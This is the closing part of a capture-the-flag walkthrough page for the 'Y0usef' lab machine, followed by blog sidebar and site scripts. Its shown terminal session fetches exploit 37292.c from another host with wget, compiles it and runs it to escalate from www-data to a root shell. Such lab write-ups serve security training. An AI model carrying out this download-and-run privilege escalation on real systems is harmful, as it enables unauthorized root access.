+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ cd /tmp</span><br><span class="line">$ wget http://192.168.118.5/37292.c</span><br><span class="line">--2021-04-02 18:02:18--  http://192.168.118.5/37292.c</span><br><span class="line">Connecting to 192.168.118.5:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3861 (3.8K) [text/x-csrc]</span><br><span class="line">Saving to: &#x27;37292.c&#x27;</span><br><span class="line"></span><br><span class="line">     0K ...                                                   100%  292M=0s</span><br><span class="line"></span><br><span class="line">2021-04-02 18:02:18 (292 MB/s) - &#x27;37292.c&#x27; saved [3861/3861]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Next, we’ll compile it with <code>gcc</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc 37292.c -o exploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Finally, we’ll launch the compiled exploit (executable permissions are already granted by <code>gcc</code>) and drop into a root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">www-data</span><br><span class="line">$ ./exploit</span><br><span class="line">spawning threads</span><br><span class="line">mount #1</span><br><span class="line">mount #2</span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line">sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line"># whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Enumeration/" rel="tag"># Enumeration</a>
+          
+            <a href="/tags/User-Credentials/" rel="tag"># User Credentials</a>
+          
+            <a href="/tags/Kernel-Exploit/" rel="tag"># Kernel Exploit</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/undefined/SunsetMidnight/" rel="next" title="SunsetMidnight">
+                <i class="fa fa-chevron-left"></i> SunsetMidnight
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/undefined/Born2Root/" rel="prev" title="Born2Root">
+                Born2Root <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/Sevion3.jpg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+               <a href="/archives/">
+	      <!-- <a href="/archives/%7C%7C%20fa-solid%20fa-align-center"> -->
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Sev1on" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://discord.gg/8gyzR5Y52X" target="_blank" title="Discord">
+                      
+                        <i class="fa fa-fw fa-fa-solid fa-link"></i>Discord</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://t.me/pay1oad" target="_blank" title="Telegram">
+                      
+                        <i class="fa fa-fw fa-fab fa-telegram"></i>Telegram</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Y0usef"><span class="nav-number">1.</span> <span class="nav-text">Y0usef</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation-Guide-for-Y0usef"><span class="nav-number">2.</span> <span class="nav-text">Exploitation Guide for Y0usef</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">2.1.</span> <span class="nav-text">Summary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap"><span class="nav-number">2.2.1.</span> <span class="nav-text">Nmap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GoBuster"><span class="nav-number">2.2.2.</span> <span class="nav-text">GoBuster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-Enumeration"><span class="nav-number">2.2.3.</span> <span class="nav-text">HTTP Enumeration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation"><span class="nav-number">2.3.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Host-Header-Injection-Vulnerability"><span class="nav-number">2.3.1.</span> <span class="nav-text">Host Header Injection Vulnerability</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Application-Credential-Guessing"><span class="nav-number">2.3.2.</span> <span class="nav-text">Application Credential Guessing</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Upload-Vulnerability"><span class="nav-number">2.3.3.</span> <span class="nav-text">File Upload Vulnerability</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Escalation"><span class="nav-number">2.4.</span> <span class="nav-text">Escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-Enumeration"><span class="nav-number">2.4.1.</span> <span class="nav-text">Local Enumeration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Escalation-via-User-Credentials"><span class="nav-number">2.4.2.</span> <span class="nav-text">Escalation via User Credentials</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Escalation-via-Kernel-Exploit"><span class="nav-number">2.4.3.</span> <span class="nav-text">Escalation via Kernel Exploit</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"> </span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+  <div id="site-runtime">
+  <span class="post-meta-item-icon">
+    <i class="fa fa-clock-o"></i>
+  </span>
+  <span id="runtime"></span>
+</div>
+
+<script language="javascript">
+  function isPC() {
+    var userAgentInfo = navigator.userAgent;
+    var agents = ["Android", "iPhone", "SymbianOS", "Windows Phone", "iPad", "iPod"];
+    for (var i = 0; i < agents.length; i++) {
+      if (userAgentInfo.indexOf(agents[i]) > 0) {
+        return false;
+      }
+    }
+    return true;
+  }
+
+  function siteTime(openOnPC, start) {
+    window.setTimeout("siteTime(openOnPC, start)", 1000);
+    var seconds = 1000;
+    var minutes = seconds * 60;
+    var hours = minutes * 60;
+    var days = hours * 24;
+    var years = days * 365;
+      start = new Date("2013-11-23 09:00:00 +0800");
+    var now = new Date();
+    var year = now.getFullYear();
+    var month = now.getMonth() + 1;
+    var date = now.getDate();
+    var hour = now.getHours();
+    var minute = now.getMinutes();
+    var second = now.getSeconds();
+    var diff = now - start;
+
+    var diffYears = Math.floor(diff / years);
+    var diffDays = Math.floor((diff / days) - diffYears * 365);
+    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes);
+    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes * minutes) / seconds);
+
+    if (openOnPC) {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + " years " + diffDays + " days " + diffHours + " hours " + diffMinutes + " mins " + diffSeconds + " secs";
+    } else {
+      document.getElementById("runtime").innerHTML = "Running: " + diffYears + "y " + diffDays + "d " + diffHours + "h " + diffMinutes + "m " + diffSeconds + "s";
+    }
+  }
+
+  var showOnMobile = false;
+  var openOnPC = isPC();
+  var start = new Date();
+  siteTime(openOnPC, start);
+
+  if (!openOnPC && !showOnMobile) {
+    document.getElementById('site-runtime').style.display = 'none';
+  }
+</script>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
